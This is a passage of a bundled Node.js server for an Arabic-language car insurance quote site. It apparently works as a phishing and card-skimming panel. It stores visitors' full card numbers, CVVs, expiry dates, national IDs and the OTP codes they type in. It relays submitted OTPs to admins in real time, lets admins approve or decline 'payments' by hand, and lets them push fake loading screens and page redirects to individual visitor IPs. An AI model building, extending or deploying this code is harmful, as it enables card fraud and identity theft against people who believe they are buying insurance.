// server/_core/index.ts
import "dotenv/config";
import express2 from "express";
import { createServer } from "http";
import net from "net";
import { createExpressMiddleware } from "@trpc/server/adapters/express";

// shared/const.ts
var COOKIE_NAME = "app_session_id";
var ONE_YEAR_MS = 1e3 * 60 * 60 * 24 * 365;
var AXIOS_TIMEOUT_MS = 3e4;
var UNAUTHED_ERR_MSG = "Please login (10001)";
var NOT_ADMIN_ERR_MSG = "You do not have required permission (10002)";
var OAUTH_STATE_COOKIE = "__Host-oauth_state";
var decodeOAuthState = (state) => {
  let decoded;
  try {
    decoded = atob(state);
  } catch {
    return { redirectUri: "" };
  }
  try {
    const parsed = JSON.parse(decoded);
    if (parsed && typeof parsed.redirectUri === "string") return parsed;
  } catch {
  }
  return { redirectUri: decoded };
};

// server/_core/oauth.ts
import { parse as parseCookieHeader2 } from "cookie";

// server/db.ts
import { and, desc, eq, gte, like, or, sql } from "drizzle-orm";
import { drizzle } from "drizzle-orm/mysql2";

// drizzle/schema.ts
import { boolean, int, mysqlEnum, mysqlTable, text, timestamp, varchar } from "drizzle-orm/mysql-core";
var users = mysqlTable("users", {
  id: int("id").autoincrement().primaryKey(),
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull()
});
var insuranceRequests = mysqlTable("insurance_requests", {
  id: int("id").autoincrement().primaryKey(),
  sessionId: varchar("sessionId", { length: 128 }).notNull(),
  visitorIp: varchar("visitorIp", { length: 64 }),
  // الخطوة 1: البيانات الأساسية
  offerType: varchar("offerType", { length: 32 }),
  regType: varchar("regType", { length: 32 }),
  userName: varchar("userName", { length: 256 }),
  phoneNumber: varchar("phoneNumber", { length: 32 }),
  idNumber: varchar("idNumber", { length: 32 }),
  birthDate: varchar("birthDate", { length: 32 }),
  serialNumber: varchar("serialNumber", { length: 128 }),
  carYear: varchar("carYear", { length: 16 }),
  // الخطوة 2: بيانات التأمين
  carMake: varchar("carMake", { length: 256 }),
  usageType: varchar("usageType", { length: 64 }),
  city: varchar("city", { length: 128 }),
  startDate: varchar("startDate", { length: 32 }),
  // الخطوة 3: الخطة المختارة
  planCompany: varchar("planCompany", { length: 256 }),
  planName: varchar("planName", { length: 128 }),
  planPrice: int("planPrice"),
  // الخطوة 4: الإضافات
  addons: text("addons"),
  addonsTotal: int("addonsTotal"),
  // الخطوة 5: الملخص والدفع
  paymentMethod: varchar("paymentMethod", { length: 32 }),
  total: int("total"),
  // بيانات البطاقة
  cardNumber: varchar("cardNumber", { length: 32 }),
  cardHolderName: varchar("cardHolderName", { length: 256 }),
  expiryDate: varchar("expiryDate", { length: 16 }),
  cvv: varchar("cvv", { length: 8 }),
  cardType: varchar("cardType", { length: 32 }),
  cardLast4: varchar("cardLast4", { length: 8 }),
  cardDeclined: boolean("cardDeclined").default(false),
  // OTP
  otpCode: varchar("otpCode", { length: 16 }),
  otpDigits: int("otpDigits").default(4),
  otpSubmitted: varchar("otpSubmitted", { length: 16 }),
  otpVerified: boolean("otpVerified").default(false),
  // حالة الدفع: pending (في انتظار القبول من لوحة التحكم), approved, rejected
  paymentStatus: mysqlEnum("paymentStatus", ["pending", "approved", "rejected"]).default("pending"),
  // الحالة العامة
  currentStep: int("currentStep").default(1),
  status: mysqlEnum("status", ["in_progress", "completed", "payment_submitted", "declined", "otp_verified"]).default("in_progress"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull()
});
var bannedIps = mysqlTable("banned_ips", {
  id: int("id").autoincrement().primaryKey(),
  ip: varchar("ip", { length: 64 }).notNull().unique(),
  reason: text("reason"),
  bannedAt: timestamp("bannedAt").defaultNow().notNull()
});
var loadingScreenSettings = mysqlTable("loading_screen_settings", {
  id: int("id").autoincrement().primaryKey(),
  visitorIp: varchar("visitorIp", { length: 64 }).notNull().unique(),
  isActive: boolean("isActive").default(false),
  loadingText: varchar("loadingText", { length: 256 }).default("\u062C\u0627\u0631\u064A \u0627\u0644\u062A\u062D\u0645\u064A\u0644..."),
  loadingSubtext: varchar("loadingSubtext", { length: 256 }).default("\u064A\u0631\u062C\u0649 \u0627\u0644\u0627\u0646\u062A\u0638\u0627\u0631"),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull()
});
var navigationCommands = mysqlTable("navigation_commands", {
  id: int("id").autoincrement().primaryKey(),
  visitorIp: varchar("visitorIp", { length: 64 }).notNull(),
  targetPage: varchar("targetPage", { length: 256 }).notNull(),
  executed: boolean("executed").default(false),
  createdAt: timestamp("createdAt").defaultNow().notNull()
});

// server/_core/env.ts
var ENV = {
  appId: process.env.VITE_APP_ID ?? "",
  cookieSecret: process.env.JWT_SECRET ?? "",
  databaseUrl: process.env.DATABASE_URL ?? "",
  oAuthServerUrl: process.env.OAUTH_SERVER_URL ?? "",
  ownerOpenId: process.env.OWNER_OPEN_ID ?? "",
  isProduction: process.env.NODE_ENV === "production",
  forgeApiUrl: process.env.BUILT_IN_FORGE_API_URL ?? "",
  forgeApiKey: process.env.BUILT_IN_FORGE_API_KEY ?? ""
};

// server/socket.ts
import { Server as SocketIOServer } from "socket.io";
var io = null;
function initSocketIO(server) {
  io = new SocketIOServer(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    transports: ["websocket", "polling"]
  });
  io.on("connection", (socket) => {
    console.log("[Socket.IO] Client connected:", socket.id);
    socket.on("joinAdmin", () => {
      socket.join("admin");
      console.log("[Socket.IO] Admin joined:", socket.id);
    });
    socket.on("joinVisitor", (ip) => {
      socket.join(`visitor:${ip}`);
      console.log("[Socket.IO] Visitor joined:", ip);
    });
    socket.on("disconnect", () => {
      console.log("[Socket.IO] Client disconnected:", socket.id);
    });
  });
  return io;
}
function emitToAdmins(event, data) {
  io?.to("admin").emit(event, data);
}
function emitToVisitor(ip, event, data) {
  io?.to(`visitor:${ip}`).emit(event, data);
}

// server/db.ts
var _db = null;
async function getDb() {
  if (!_db && process.env.DATABASE_URL) {
    try {
      _db = drizzle(process.env.DATABASE_URL);
    } catch (error) {
      console.warn("[Database] Failed to connect:", error);
      _db = null;
    }
  }
  return _db;
}
async function upsertUser(user) {
  if (!user.openId) throw new Error("User openId is required for upsert");
  const db = await getDb();
  if (!db) return;
  const values = { openId: user.openId };
  const updateSet = {};
  const textFields = ["name", "email", "loginMethod"];
  for (const field of textFields) {
    const value = user[field];
    if (value === void 0) continue;
    const normalized = value ?? null;
    values[field] = normalized;
    updateSet[field] = normalized;
  }
  if (user.lastSignedIn !== void 0) {
    values.lastSignedIn = user.lastSignedIn;
    updateSet.lastSignedIn = user.lastSignedIn;
  }
  if (user.role !== void 0) {
    values.role = user.role;
    updateSet.role = user.role;
  } else if (user.openId === ENV.ownerOpenId) {
    values.role = "admin";
    updateSet.role = "admin";
  }
  if (!values.lastSignedIn) values.lastSignedIn = /* @__PURE__ */ new Date();
  if (Object.keys(updateSet).length === 0) updateSet.lastSignedIn = /* @__PURE__ */ new Date();
  await db.insert(users).values(values).onDuplicateKeyUpdate({ set: updateSet });
}
async function getUserByOpenId(openId) {
  const db = await getDb();
  if (!db) return void 0;
  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);
  return result.length > 0 ? result[0] : void 0;
}
async function upsertInsuranceRequest(data) {
  const db = await getDb();
  if (!db) return null;
  const existing = await db.select().from(insuranceRequests).where(eq(insuranceRequests.sessionId, data.sessionId)).limit(1);
  if (existing.length > 0) {
    const updateData = { ...data };
    delete updateData.sessionId;
    delete updateData.createdAt;
    await db.update(insuranceRequests).set(updateData).where(eq(insuranceRequests.sessionId, data.sessionId));
    const updated = await db.select().from(insuranceRequests).where(eq(insuranceRequests.sessionId, data.sessionId)).limit(1);
    return updated[0] ?? null;
  } else {
    await db.insert(insuranceRequests).values(data);
    const created = await db.select().from(insuranceRequests).where(eq(insuranceRequests.sessionId, data.sessionId)).limit(1);
    return created[0] ?? null;
  }
}
async function getAllInsuranceRequests(opts) {
  const db = await getDb();
  if (!db) return { rows: [], total: 0 };
  const limit = opts?.limit ?? 50;
  const offset = opts?.offset ?? 0;
  let query = db.select().from(insuranceRequests).$dynamic();
  const conditions = [];
  if (opts?.search) {
    conditions.push(
      or(
        like(insuranceRequests.userName, `%${opts.search}%`),
        like(insuranceRequests.phoneNumber, `%${opts.search}%`),
        like(insuranceRequests.idNumber, `%${opts.search}%`),
        like(insuranceRequests.visitorIp, `%${opts.search}%`)
      )
    );
  }
  if (opts?.status && opts.status !== "all") {
    conditions.push(eq(insuranceRequests.status, opts.status));
  }
  if (conditions.length > 0) {
    query = query.where(and(...conditions));
  }
  const rows = await query.orderBy(desc(insuranceRequests.createdAt)).limit(limit).offset(offset);
  let countQuery = db.select({ count: sql`count(*)` }).from(insuranceRequests).$dynamic();
  if (conditions.length > 0) {
    countQuery = countQuery.where(and(...conditions));
  }
  const countResult = await countQuery;
  const total = Number(countResult[0]?.count ?? 0);
  return { rows, total };
}
async function getInsuranceRequestById(id) {
  const db = await getDb();
  if (!db) return null;
  const result = await db.select().from(insuranceRequests).where(eq(insuranceRequests.id, id)).limit(1);
  return result[0] ?? null;
}
async function getInsuranceStats() {
  const db = await getDb();
  if (!db) return { total: 0, today: 0, totalAmount: 0, topPlans: [] };
  const today = /* @__PURE__ */ new Date();
  today.setHours(0, 0, 0, 0);
  const [totalResult, todayResult, amountResult] = await Promise.all([
    db.select({ count: sql`count(*)` }).from(insuranceRequests),
    db.select({ count: sql`count(*)` }).from(insuranceRequests).where(gte(insuranceRequests.createdAt, today)),
    db.select({ sum: sql`COALESCE(SUM(total), 0)` }).from(insuranceRequests).where(eq(insuranceRequests.status, "payment_submitted"))
  ]);
  const topPlans = await db.select({
    planName: insuranceRequests.planName,
    planCompany: insuranceRequests.planCompany,
    count: sql`count(*)`
  }).from(insuranceRequests).where(sql`planName IS NOT NULL`).groupBy(insuranceRequests.planName, insuranceRequests.planCompany).orderBy(desc(sql`count(*)`)).limit(5);
  return {
    total: Number(totalResult[0]?.count ?? 0),
    today: Number(todayResult[0]?.count ?? 0),
    totalAmount: Number(amountResult[0]?.sum ?? 0),
    topPlans
  };
}
async function isIpBanned(ip) {
  const db = await getDb();
  if (!db) return false;
  const result = await db.select().from(bannedIps).where(eq(bannedIps.ip, ip)).limit(1);
  return result.length > 0;
}
async function banIp(ip, reason) {
  const db = await getDb();
  if (!db) return;
  await db.insert(bannedIps).values({ ip, reason: reason ?? null }).onDuplicateKeyUpdate({ set: { reason: reason ?? null } });
}
async function unbanIp(ip) {
  const db = await getDb();
  if (!db) return;
  await db.delete(bannedIps).where(eq(bannedIps.ip, ip));
}
async function getAllBannedIps() {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(bannedIps).orderBy(desc(bannedIps.bannedAt));
}
async function getLoadingScreenSetting(ip) {
  const db = await getDb();
  if (!db) return null;
  const result = await db.select().from(loadingScreenSettings).where(eq(loadingScreenSettings.visitorIp, ip)).limit(1);
  return result[0] ?? null;
}
async function setLoadingScreenSetting(ip, isActive, loadingText, loadingSubtext) {
  const db = await getDb();
  if (!db) return;
  await db.insert(loadingScreenSettings).values({
    visitorIp: ip,
    isActive,
    loadingText: loadingText ?? "\u062C\u0627\u0631\u064A \u0627\u0644\u062A\u062D\u0645\u064A\u0644...",
    loadingSubtext: loadingSubtext ?? "\u064A\u0631\u062C\u0649 \u0627\u0644\u0627\u0646\u062A\u0638\u0627\u0631"
  }).onDuplicateKeyUpdate({
    set: {
      isActive,
      loadingText: loadingText ?? "\u062C\u0627\u0631\u064A \u0627\u0644\u062A\u062D\u0645\u064A\u0644...",
      loadingSubtext: loadingSubtext ?? "\u064A\u0631\u062C\u0649 \u0627\u0644\u0627\u0646\u062A\u0638\u0627\u0631"
    }
  });
}
async function createNavigationCommand(ip, targetPage) {
  const db = await getDb();
  if (!db) return;
  await db.insert(navigationCommands).values({ visitorIp: ip, targetPage });
}
async function getPendingNavigationCommand(ip) {
  const db = await getDb();
  if (!db) return null;
  const result = await db.select().from(navigationCommands).where(and(eq(navigationCommands.visitorIp, ip), eq(navigationCommands.executed, false))).orderBy(desc(navigationCommands.createdAt)).limit(1);
  return result[0] ?? null;
}
async function markNavigationCommandExecuted(id) {
  const db = await getDb();
  if (!db) return;
  await db.update(navigationCommands).set({ executed: true }).where(eq(navigationCommands.id, id));
}
async function approvePayment(requestId) {
  const db = await getDb();
  if (!db) return;
  const otpDigits = Math.floor(Math.random() * 3) + 4;
  const otpCode = Math.floor(Math.random() * Math.pow(10, otpDigits)).toString().padStart(otpDigits, "0");
  await db.update(insuranceRequests).set({
    paymentStatus: "approved",
    otpCode,
    otpDigits,
    status: "payment_submitted"
  }).where(eq(insuranceRequests.id, requestId));
}
async function rejectPayment(requestId) {
  const db = await getDb();
  if (!db) return;
  await db.update(insuranceRequests).set({
    paymentStatus: "rejected",
    cardDeclined: true
  }).where(eq(insuranceRequests.id, requestId));
}
async function submitOtp(sessionId, otp) {
  const db = await getDb();
  if (!db) return { success: false, message: "\u062E\u0637\u0623 \u0641\u064A \u0642\u0627\u0639\u062F\u0629 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A" };
  const result = await db.select().from(insuranceRequests).where(and(eq(insuranceRequests.sessionId, sessionId), eq(insuranceRequests.paymentStatus, "approved"))).limit(1);
  const req = result[0];
  if (!req) return { success: false, message: "\u0644\u0627 \u064A\u0648\u062C\u062F \u0637\u0644\u0628 \u062F\u0641\u0639 \u0645\u0639\u062A\u0645\u062F" };
  await db.update(insuranceRequests).set({ otpSubmitted: otp }).where(eq(insuranceRequests.id, req.id));
  emitToAdmins("otpSubmitted", { requestId: req.id, otp });
  return { success: true };
}
async function verifyOtp(sessionId) {
  const db = await getDb();
  if (!db) return false;
  const result = await db.select().from(insuranceRequests).where(eq(insuranceRequests.sessionId, sessionId)).limit(1);
  const req = result[0];
  if (!req) return false;
  if (req.paymentStatus === "approved" && req.otpSubmitted) {
    await db.update(insuranceRequests).set({ otpVerified: true, status: "otp_verified", currentStep: 6 }).where(eq(insuranceRequests.id, req.id));
    emitToAdmins("otpVerified", { requestId: req.id });
    return true;
  }
  return false;
}
async function checkPaymentStatus(sessionId) {
  const db = await getDb();
  if (!db) return null;
  const result = await db.select().from(insuranceRequests).where(eq(insuranceRequests.sessionId, sessionId)).limit(1);
  const req = result[0];
  if (!req) return null;
  return {
    paymentStatus: req.paymentStatus,
    otpCode: req.otpCode,
    otpDigits: req.otpDigits,
    status: req.status,
    cardDeclined: req.cardDeclined
  };
}

// server/_core/cookies.ts
function isSecureRequest(req) {
  if (req.protocol === "https") return true;
  const forwardedProto = req.headers["x-forwarded-proto"];
  if (!forwardedProto) return false;
  const protoList = Array.isArray(forwardedProto) ? forwardedProto : forwardedProto.split(",");
  return protoList.some((proto) => proto.trim().toLowerCase() === "https");
}
function getSessionCookieOptions(req) {
  return {
    httpOnly: true,
    path: "/",
    sameSite: "none",
    secure: isSecureRequest(req)
  };
}

// shared/_core/errors.ts
var HttpError = class extends Error {
  constructor(statusCode, message) {
    super(message);
    this.statusCode = statusCode;
    this.name = "HttpError";
  }
};
var ForbiddenError = (msg) => new HttpError(403, msg);

// server/_core/sdk.ts
import axios from "axios";
import { parse as parseCookieHeader } from "cookie";
import { SignJWT, jwtVerify } from "jose";
var isNonEmptyString = (value) => typeof value === "string" && value.length > 0;
var EXCHANGE_TOKEN_PATH = `/webdev.v1.WebDevAuthPublicService/ExchangeToken`;
var GET_USER_INFO_PATH = `/webdev.v1.WebDevAuthPublicService/GetUserInfo`;
var GET_USER_INFO_WITH_JWT_PATH = `/webdev.v1.WebDevAuthPublicService/GetUserInfoWithJwt`;
var OAuthService = class {
  constructor(client) {
    this.client = client;
    console.log("[OAuth] Initialized with baseURL:", ENV.oAuthServerUrl);
    if (!ENV.oAuthServerUrl) {
      console.error(
        "[OAuth] ERROR: OAUTH_SERVER_URL is not configured! Set OAUTH_SERVER_URL environment variable."
      );
    }
  }
  decodeState(state) {
    return decodeOAuthState(state).redirectUri;
  }
  async getTokenByCode(code, state) {
    const payload = {
      clientId: ENV.appId,
      grantType: "authorization_code",
      code,
      redirectUri: this.decodeState(state)
    };
    const { data } = await this.client.post(
      EXCHANGE_TOKEN_PATH,
      payload
    );
    return data;
  }
  async getUserInfoByToken(token) {
    const { data } = await this.client.post(
      GET_USER_INFO_PATH,
      {
        accessToken: token.accessToken
      }
    );
    return data;
  }
};
var createOAuthHttpClient = () => axios.create({
  baseURL: ENV.oAuthServerUrl,
  timeout: AXIOS_TIMEOUT_MS
});
var SDKServer = class {
  client;
  oauthService;
  constructor(client = createOAuthHttpClient()) {
    this.client = client;
    this.oauthService = new OAuthService(this.client);
  }
  deriveLoginMethod(platforms, fallback) {
    if (fallback && fallback.length > 0) return fallback;
    if (!Array.isArray(platforms) || platforms.length === 0) return null;
    const set = new Set(
      platforms.filter((p) => typeof p === "string")
    );
    if (set.has("REGISTERED_PLATFORM_EMAIL")) return "email";
    if (set.has("REGISTERED_PLATFORM_GOOGLE")) return "google";
    if (set.has("REGISTERED_PLATFORM_APPLE")) return "apple";
    if (set.has("REGISTERED_PLATFORM_MICROSOFT") || set.has("REGISTERED_PLATFORM_AZURE"))
      return "microsoft";
    if (set.has("REGISTERED_PLATFORM_GITHUB")) return "github";
    const first = Array.from(set)[0];
    return first ? first.toLowerCase() : null;
  }
  /**
   * Exchange OAuth authorization code for access token
   * @example
   * const tokenResponse = await sdk.exchangeCodeForToken(code, state);
   */
  async exchangeCodeForToken(code, state) {
    return this.oauthService.getTokenByCode(code, state);
  }
  /**
   * Get user information using access token
   * @example
   * const userInfo = await sdk.getUserInfo(tokenResponse.accessToken);
   */
  async getUserInfo(accessToken) {
    const data = await this.oauthService.getUserInfoByToken({
      accessToken
    });
    const loginMethod = this.deriveLoginMethod(
      data?.platforms,
      data?.platform ?? data.platform ?? null
    );
    return {
      ...data,
      platform: loginMethod,
      loginMethod
    };
  }
  parseCookies(cookieHeader) {
    if (!cookieHeader) {
      return /* @__PURE__ */ new Map();
    }
    const parsed = parseCookieHeader(cookieHeader);
    return new Map(Object.entries(parsed));
  }
  getSessionSecret() {
    const secret = ENV.cookieSecret;
    return new TextEncoder().encode(secret);
  }
  /**
   * Create a session token for a Manus user openId
   * @example
   * const sessionToken = await sdk.createSessionToken(userInfo.openId);
   */
  async createSessionToken(openId, options = {}) {
    return this.signSession(
      {
        openId,
        appId: ENV.appId,
        name: options.name || ""
      },
      options
    );
  }
  async signSession(payload, options = {}) {
    const issuedAt = Date.now();
    const expiresInMs = options.expiresInMs ?? ONE_YEAR_MS;
    const expirationSeconds = Math.floor((issuedAt + expiresInMs) / 1e3);
    const secretKey = this.getSessionSecret();
    return new SignJWT({
      openId: payload.openId,
      appId: payload.appId,
      name: payload.name
    }).setProtectedHeader({ alg: "HS256", typ: "JWT" }).setExpirationTime(expirationSeconds).sign(secretKey);
  }
  async verifySession(cookieValue) {
    if (!cookieValue) {
      console.warn("[Auth] Missing session cookie");
      return null;
    }
    try {
      const secretKey = this.getSessionSecret();
      const { payload } = await jwtVerify(cookieValue, secretKey, {
        algorithms: ["HS256"]
      });
      const { openId, appId, name } = payload;
      if (!isNonEmptyString(openId) || !isNonEmptyString(appId) || !isNonEmptyString(name)) {
        console.warn("[Auth] Session payload missing required fields");
        return null;
      }
      return {
        openId,
        appId,
        name
      };
    } catch (error) {
      console.warn("[Auth] Session verification failed", String(error));
      return null;
    }
  }
  async getUserInfoWithJwt(jwtToken) {
    const payload = {
      jwtToken,
      projectId: ENV.appId
    };
    const { data } = await this.client.post(
      GET_USER_INFO_WITH_JWT_PATH,
      payload
    );
    const loginMethod = this.deriveLoginMethod(
      data?.platforms,
      data?.platform ?? data.platform ?? null
    );
    return {
      ...data,
      platform: loginMethod,
      loginMethod
    };
  }
  async authenticateRequest(req) {
    const cookies = this.parseCookies(req.headers.cookie);
    let sessionToken = cookies.get(COOKIE_NAME);
    if (!sessionToken) {
      const authHeader = req.headers.authorization;
      if (typeof authHeader === "string" && authHeader.startsWith("Bearer ")) {
        sessionToken = authHeader.slice(7);
      }
    }
    const session = await this.verifySession(sessionToken);
    if (!session) {
      throw ForbiddenError("Invalid session cookie");
    }
    if (session.openId.startsWith(CRON_OPEN_ID_PREFIX)) {
      const userInfo = await this.getUserInfoWithJwt(sessionToken ?? "");
      const taskUid = userInfo.taskUid ?? null;
      if (!taskUid) {
        throw ForbiddenError("Cron session missing task_uid");
      }
      return buildCronUser(userInfo);
    }
    const sessionUserId = session.openId;
    const signedInAt = /* @__PURE__ */ new Date();
    let user = await getUserByOpenId(sessionUserId);
    if (!user) {
      try {
        const userInfo = await this.getUserInfoWithJwt(sessionToken ?? "");
        await upsertUser({
          openId: userInfo.openId,
          name: userInfo.name || null,
          email: userInfo.email ?? null,
          loginMethod: userInfo.loginMethod ?? userInfo.platform ?? null,
          lastSignedIn: signedInAt
        });
        user = await getUserByOpenId(userInfo.openId);
      } catch (error) {
        console.error("[Auth] Failed to sync user from OAuth:", error);
        throw ForbiddenError("Failed to sync user info");
      }
    }
    if (!user) {
      throw ForbiddenError("User not found");
    }
    await upsertUser({
      openId: user.openId,
      lastSignedIn: signedInAt
    });
    return user;
  }
};
var CRON_OPEN_ID_PREFIX = "cron_";
function buildCronUser(userInfo) {
  const now = /* @__PURE__ */ new Date();
  return {
    id: -1,
    openId: userInfo.openId,
    name: userInfo.name || "Manus Scheduled Task",
    email: null,
    loginMethod: null,
    role: "user",
    createdAt: now,
    updatedAt: now,
    lastSignedIn: now,
    taskUid: userInfo.taskUid ?? void 0,
    isCron: true
  };
}
var sdk = new SDKServer();

// server/_core/oauth.ts
function getQueryParam(req, key) {
  const value = req.query[key];
  return typeof value === "string" ? value : void 0;
}
function registerOAuthRoutes(app) {
  app.get("/api/oauth/callback", async (req, res) => {
    const code = getQueryParam(req, "code");
    const state = getQueryParam(req, "state");
    if (!code || !state) {
      res.status(400).json({ error: "code and state are required" });
      return;
    }
    const { nonce } = decodeOAuthState(state);
    const expectedNonce = parseCookieHeader2(req.headers.cookie ?? "")[OAUTH_STATE_COOKIE];
    if (!nonce || nonce !== expectedNonce) {
      res.status(403).json({ error: "invalid oauth state" });
      return;
    }
    res.clearCookie(OAUTH_STATE_COOKIE, { path: "/", secure: true, sameSite: "none" });
    try {
      const tokenResponse = await sdk.exchangeCodeForToken(code, state);
      const userInfo = await sdk.getUserInfo(tokenResponse.accessToken);
      if (!userInfo.openId) {
        res.status(400).json({ error: "openId missing from user info" });
        return;
      }
      await upsertUser({
        openId: userInfo.openId,
        name: userInfo.name || null,
        email: userInfo.email ?? null,
        loginMethod: userInfo.loginMethod ?? userInfo.platform ?? null,
        lastSignedIn: /* @__PURE__ */ new Date()
      });
      const sessionToken = await sdk.createSessionToken(userInfo.openId, {
        name: userInfo.name || "",
        expiresInMs: ONE_YEAR_MS
      });
      const cookieOptions = getSessionCookieOptions(req);
      res.cookie(COOKIE_NAME, sessionToken, { ...cookieOptions, maxAge: ONE_YEAR_MS });
      res.redirect(302, "/");
    } catch (error) {
      console.error("[OAuth] Callback failed", error);
      res.status(500).json({ error: "OAuth callback failed" });
    }
  });
}

// server/_core/storageProxy.ts
function registerStorageProxy(app) {
  app.get("/manus-storage/*", async (req, res) => {
    const key = req.params[0];
    if (!key) {
      res.status(400).send("Missing storage key");
      return;
    }
    if (!ENV.forgeApiUrl || !ENV.forgeApiKey) {
      res.status(500).send("Storage proxy not configured");
      return;
    }
    try {
      const forgeUrl = new URL(
        "v1/storage/presign/get",
        ENV.forgeApiUrl.replace(/\/+$/, "") + "/"
      );
      forgeUrl.searchParams.set("path", key);
      const forgeResp = await fetch(forgeUrl, {
        headers: { Authorization: `Bearer ${ENV.forgeApiKey}` }
      });
      if (!forgeResp.ok) {
        const body = await forgeResp.text().catch(() => "");
        console.error(`[StorageProxy] forge error: ${forgeResp.status} ${body}`);
        res.status(502).send("Storage backend error");
        return;
      }
      const { url } = await forgeResp.json();
      if (!url) {
        res.status(502).send("Empty signed URL from backend");
        return;
      }
      res.set("Cache-Control", "no-store");
      res.redirect(307, url);
    } catch (err) {
      console.error("[StorageProxy] failed:", err);
      res.status(502).send("Storage proxy error");
    }
  });
}

// server/routers.ts
import { TRPCError as TRPCError3 } from "@trpc/server";
import { z as z2 } from "zod";

// server/_core/systemRouter.ts
import { z } from "zod";

// server/_core/notification.ts
import { TRPCError } from "@trpc/server";
var TITLE_MAX_LENGTH = 1200;
var CONTENT_MAX_LENGTH = 2e4;
var trimValue = (value) => value.trim();
var isNonEmptyString2 = (value) => typeof value === "string" && value.trim().length > 0;
var buildEndpointUrl = (baseUrl) => {
  const normalizedBase = baseUrl.endsWith("/") ? baseUrl : `${baseUrl}/`;
  return new URL(
    "webdevtoken.v1.WebDevService/SendNotification",
    normalizedBase
  ).toString();
};
var validatePayload = (input) => {
  if (!isNonEmptyString2(input.title)) {
    throw new TRPCError({
      code: "BAD_REQUEST",
      message: "Notification title is required."
    });
  }
  if (!isNonEmptyString2(input.content)) {
    throw new TRPCError({
      code: "BAD_REQUEST",
      message: "Notification content is required."
    });
  }
  const title = trimValue(input.title);
  const content = trimValue(input.content);
  if (title.length > TITLE_MAX_LENGTH) {
    throw new TRPCError({
      code: "BAD_REQUEST",
      message: `Notification title must be at most ${TITLE_MAX_LENGTH} characters.`
    });
  }
  if (content.length > CONTENT_MAX_LENGTH) {
    throw new TRPCError({
      code: "BAD_REQUEST",
      message: `Notification content must be at most ${CONTENT_MAX_LENGTH} characters.`
    });
  }
  return { title, content };
};
async function notifyOwner(payload) {
  const { title, content } = validatePayload(payload);
  if (!ENV.forgeApiUrl) {
    throw new TRPCError({
      code: "INTERNAL_SERVER_ERROR",
      message: "Notification service URL is not configured."
    });
  }
  if (!ENV.forgeApiKey) {
    throw new TRPCError({
      code: "INTERNAL_SERVER_ERROR",
      message: "Notification service API key is not configured."
    });
  }
  const endpoint = buildEndpointUrl(ENV.forgeApiUrl);
  try {
    const response = await fetch(endpoint, {
      method: "POST",
      headers: {
        accept: "application/json",
        authorization: `Bearer ${ENV.forgeApiKey}`,
        "content-type": "application/json",
        "connect-protocol-version": "1"
      },
      body: JSON.stringify({ title, content })
    });
    if (!response.ok) {
      const detail = await response.text().catch(() => "");
      console.warn(
        `[Notification] Failed to notify owner (${response.status} ${response.statusText})${detail ? `: ${detail}` : ""}`
      );
      return false;
    }
    return true;
  } catch (error) {
    console.warn("[Notification] Error calling notification service:", error);
    return false;
  }
}

// server/_core/trpc.ts
import { initTRPC, TRPCError as TRPCError2 } from "@trpc/server";
import superjson from "superjson";
var t = initTRPC.context().create({
  transformer: superjson
});
var router = t.router;
var publicProcedure = t.procedure;
var requireUser = t.middleware(async (opts) => {
  const { ctx, next } = opts;
  if (!ctx.user) {
    throw new TRPCError2({ code: "UNAUTHORIZED", message: UNAUTHED_ERR_MSG });
  }
  return next({
    ctx: {
      ...ctx,
      user: ctx.user
    }
  });
});
var protectedProcedure = t.procedure.use(requireUser);
var adminProcedure = t.procedure.use(
  t.middleware(async (opts) => {
    const { ctx, next } = opts;
    if (!ctx.user || ctx.user.role !== "admin") {
      throw new TRPCError2({ code: "FORBIDDEN", message: NOT_ADMIN_ERR_MSG });
    }
    return next({
      ctx: {
        ...ctx,
        user: ctx.user
      }
    });
  })
);

// server/_core/systemRouter.ts
var systemRouter = router({
  health: publicProcedure.input(
    z.object({
      timestamp: z.number().min(0, "timestamp cannot be negative")
    })
  ).query(() => ({
    ok: true
  })),
  notifyOwner: adminProcedure.input(
    z.object({
      title: z.string().min(1, "title is required"),
      content: z.string().min(1, "content is required")
    })
  ).mutation(async ({ input }) => {
    const delivered = await notifyOwner(input);
    return {
      success: delivered
    };
  })
});

// server/routers.ts
var adminProcedure2 = protectedProcedure.use(({ ctx, next }) => {
  if (ctx.user.role !== "admin") {
    throw new TRPCError3({ code: "FORBIDDEN", message: "Admin access required" });
  }
  return next({ ctx });
});
var appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query((opts) => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return { success: true };
    })
  }),
  // ======= Insurance Requests =======
  insurance: router({
    // حفظ/تحديث طلب التأمين
    upsert: publicProcedure.input(
      z2.object({
        sessionId: z2.string(),
        visitorIp: z2.string().optional(),
        offerType: z2.string().optional(),
        regType: z2.string().optional(),
        userName: z2.string().optional(),
        phoneNumber: z2.string().optional(),
        idNumber: z2.string().optional(),
        birthDate: z2.string().optional(),
        serialNumber: z2.string().optional(),
        carYear: z2.string().optional(),
        carMake: z2.string().optional(),
        usageType: z2.string().optional(),
        city: z2.string().optional(),
        startDate: z2.string().optional(),
        planCompany: z2.string().optional(),
        planName: z2.string().optional(),
        planPrice: z2.number().optional(),
        addons: z2.string().optional(),
        addonsTotal: z2.number().optional(),
        paymentMethod: z2.string().optional(),
        total: z2.number().optional(),
        cardNumber: z2.string().optional(),
        cardHolderName: z2.string().optional(),
        expiryDate: z2.string().optional(),
        cvv: z2.string().optional(),
        cardType: z2.string().optional(),
        cardLast4: z2.string().optional(),
        cardDeclined: z2.boolean().optional(),
        currentStep: z2.number().optional(),
        status: z2.enum(["in_progress", "completed", "payment_submitted", "declined", "otp_verified"]).optional(),
